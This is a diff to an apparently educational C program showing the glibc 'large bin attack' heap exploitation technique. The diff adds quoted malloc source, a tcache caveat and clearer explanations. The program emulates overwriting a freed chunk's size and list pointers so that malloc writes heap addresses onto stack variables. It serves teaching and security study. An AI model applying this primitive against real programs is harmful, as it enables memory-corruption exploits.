@@ -1,8 +1,37 @@
+/*
+
+    This technique is taken from
+    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
+
+    [...]
+
+              else
+              {
+                  victim->fd_nextsize = fwd;
+                  victim->bk_nextsize = fwd->bk_nextsize;
+                  fwd->bk_nextsize = victim;
+                  victim->bk_nextsize->fd_nextsize = victim;
+              }
+              bck = fwd->bk;
+
+    [...]
+
+    mark_bin (av, victim_index);
+    victim->bk = bck;
+    victim->fd = fwd;
+    fwd->bk = victim;
+    bck->fd = victim;
+
+    [...]
+
+ */
+
 #include<stdio.h>
 #include<stdlib.h>
  
 int main()
 {
+    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
     fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
     fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
            "global variable global_max_fast in libc for further fastbin attack\n\n");
@@ -42,8 +71,8 @@ int main()
 
     malloc(0x90);
     fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
-            " freed second large chunk into the large bin, use parts of the freed first large chunk for allocation, and"
-            " reinsert the remaining of the freed first large chunk into the unsorted bin:"
+            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
+            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
             " %p\n\n", (void *)((char *)p1 + 0x90));
 
     free(p3);
@@ -52,6 +81,9 @@ int main()
 
     fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
             " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
+    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
+            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
+            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
 
     p2[-1] = 0x3f1;
     p2[0] = 0;
@@ -63,7 +95,9 @@ int main()
 
     malloc(0x90);
  
-    fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n");
+    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
+            " During this time, targets should have already been rewritten:\n");
+
     fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
     fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
 
